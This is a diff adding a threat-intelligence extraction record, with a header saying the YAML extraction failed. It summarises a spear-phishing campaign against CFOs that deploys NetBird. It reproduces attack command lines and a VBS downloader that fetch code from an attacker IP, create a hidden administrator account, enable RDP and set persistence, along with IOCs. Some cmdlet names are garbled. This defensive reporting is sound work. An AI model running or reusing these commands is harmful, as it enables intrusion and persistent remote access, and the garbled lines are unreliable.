@@ -1,0 +1,74 @@
+# Failed YAML extraction
+# Timestamp: 2026-05-01T17:36:01.626263
+# Response length: 5762 chars
+# Input chunk preview: '883cd659ef9957fded2516b70c341cis.vbsHash (MD5)7ddc947ce8999c8a4a36ac170dcd7505CERT_LOCT_C3860_012025.vbsHash (MD5)2cddc7a31ea289e8c1e5469f094e975aATTESTATION_LETPOLC3860_13891333.vbsHash (MD5)f359f20d'
+# ============================================================
+
+title: "A Flyby on the CFO's Inbox: Spear-Phishing Campaign Targeting Financial Executives with NetBird Deployment"
+description: A sophisticated spear-phishing campaign targeting CFOs and finance executives across various regions aimed to deploy NetBird, a legitimate remote-access tool, for persistent access.
+attribution: ""
+malware_families:
+  - NetBird
+cves: []
+ttps:
+  processes:
+    - wscript.exe
+    - powershell.exe
+    - msiexec.exe
+    - netbird.exe
+  command_lines:
+    - "powershell -NoP -W Hidden -C (New-Object System.Net.WebClient).DownloadFile('http://198.46.178.135/34564/cis.ico', 'C:\bin\cis.vbs')"
+    - "powershell -NoP -W Hidden -C Rename-Titem -Path 'C:\bin\trm' -NewName C:\bin\trm.zip; Expand-Archive -Path 'C:\bin\trm.zip' -DestinationPath 'C:\bin\' -Force"
+    - "msiexec /i C:\bin\netbird.msi /qn /norestart"
+    - "msiexec /i C:\bin\OpensSH.msi /qn /norestart"
+    - "powershell -NoP -W Hidden -C sc.exe config sshd start= auto; net start sshd; sc.exe config netbird start= auto; net start netbird"
+    - "powershell -NoP -W Hidden -C Start-Process -FilePath 'C:\Program Files\Netbird\netbird.exe' -ArgumentList 'up --setup-key EA8EAA70-ACFA-4A77-946B-C8ESOA60855A' -Windowstyle Hidden"
+    - "powershell -NoP -W Hidden -C net user user Bs@202122 /add /y; net localgroup Administrators user /add; reg add 'HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon\specialAccounts\UserList' /t REG_DWORD /f /d 0 /v user"
+    - "wmic UserAccount where Name='user' set PasswordExpires=False"
+    - "powershell -NoP -W Hidden -C Set-TitemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name fDenyTSConnections -value 0; Enable-NetFirewallRule -DisplayGroup Remote Desktop; sc.exe config TermService start= auto; net start TermService"
+    - "powershell -NoP -W Hidden -C sc.exe config netbird start= delayed-auto; schtasks /create /tn 'Start Netbird' /tr \"net start netbird\" /sc onstart /ru SYSTEM /f"
+    - "powershell -NoP -W Hidden -C Remove-Titem -Path 'C:\Users\Public\Desktop\Netbird.lnk' -Force -ErrorAction SilentlyContinue; Remove-Ttem -Path 'C:\Users\*\Desktop\Netbird.lnk' -Force -ErrorAction SilentlyContinue"
+  powershell:
+    - "(New-Object System.Net.WebClient).DownloadFile('http://198.46.178.135/34564/cis.ico', 'C:\bin\cis.vbs')"
+    - "Rename-Titem -Path 'C:\bin\trm' -NewName C:\bin\trm.zip; Expand-Archive -Path 'C:\bin\trm.zip' -DestinationPath 'C:\bin\' -Force"
+    - "sc.exe config sshd start= auto; net start sshd; sc.exe config netbird start= auto; net start netbird"
+    - "Start-Process -FilePath 'C:\Program Files\Netbird\netbird.exe' -ArgumentList 'up --setup-key EA8EAA70-ACFA-4A77-946B-C8ESOA60855A' -Windowstyle Hidden"
+    - "net user user Bs@202122 /add /y; net localgroup Administrators user /add; reg add 'HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon\specialAccounts\UserList' /t REG_DWORD /f /d 0 /v user"
+    - "Set-TitemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name fDenyTSConnections -value 0; Enable-NetFirewallRule -DisplayGroup Remote Desktop; sc.exe config TermService start= auto; net start TermService"
+    - "sc.exe config netbird start= delayed-auto; schtasks /create /tn 'Start Netbird' /tr \"net start netbird\" /sc onstart /ru SYSTEM /f"
+    - "Remove-Titem -Path 'C:\Users\Public\Desktop\Netbird.lnk' -Force -ErrorAction SilentlyContinue; Remove-Ttem -Path 'C:\Users\*\Desktop\Netbird.lnk' -Force -ErrorAction SilentlyContinue"
+  scripts:
+    - "{Dim objFso, objshell, scriptURL, savePath, http, stream* Definir l'URL du fichier a telechargerscriptURL = \"http://198.46.178.135/34564/cis.ico\"* Chemin de sauvegardesavePath = \"C:\\bin\\cis.vbs\"' Creer un objet FSOSet objFSO = Createobject(\"Scripting.FileSystemobject\")' Creer le dossier C:\\bin s'il n'existe pasIf Not objFs0.FolderExists(\"C:\\bin\") ThenobjFs0.CreateFolder \"C:\\bin\"End If* Telecharger le fichierSet http = CreateObject(\"WinHttp.WinHttpRequest.5.1\")http.Open \"GET\", scriptURL, Falsehttp.SendIf http.Status = 200 ThenSet stream = CreateObject(\"ADODB.Stream\")stream.Type = 1 ' binairestream.Openstream.Write http.ResponseBodystream.SaveToFile savePath, 2 ' remplacer si existestream.CloseEnd If* Executer le script telecharge en tant qu'administrateur (fendtre cachee)set objshell = Createobject(\"shell.ApplicationTM)objshell.shellExecute \"wscript.exe, \"\"\" & savePath & \"\"\", \"\", \"runas, @* ouvrir le lien dans le navigateur par defautset shell = CreateObject(\"WScript.shellTM)shell.Run \"https://googl-165a0.web.app/file/1rkh3Y-1r]_d3jgeBZao-pGAShey6H-gS-error , @' Nettoyageset objshell = NothingSet objFsO = NothingSet http = NothingSet stream = Nothingset shell = Nothing}"
+  registry_keys:
+    - "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon\specialAccounts\UserList"
+    - "HKLM\System\CurrentControlSet\Control\Terminal Server"
+  image_loads: []
+  network_connections:
+    - "wscript.exe -> http://198.46.178.135:80"
+    - "powershell.exe -> http://198.46.178.135:80"
+  file_activity:
+    - "C:\bin\cis.vbs"
+    - "C:\bin\trm"
+    - "C:\bin\trm.zip"
+    - "C:\Program Files\Netbird\netbird.exe"
+    - "C:\Users\Public\Desktop\Netbird.lnk"
+  persistence:
+    - "Scheduled task 'Start Netbird'"
+    - "Registry Run key for netbird and sshd services"
+  process_relations: []
+iocs:
+  hashes: []
+  ip_addresses:
+    - 198.46.178.135
+  domains:
+    - googl-6eTif.firebaseapp.com
+    - googl-165a0.web.app
+    - cloud-ed980.web.app
+    - cloud-233fe.firebaseapp.com
+    - cloud-233f9.firebaseapp.com
+    - cloud-233f0.web.app
+  urls:
+    - hxxps://googl-6eTif.firebaseapp.com/scan/file-846873865383.html
+    - hxxps://googl-165a0.web.app/file/1rkh3Y-1r]_d3jgeBZao-pGAShey6H-gS-error
+authors:
+  - "Trellix"
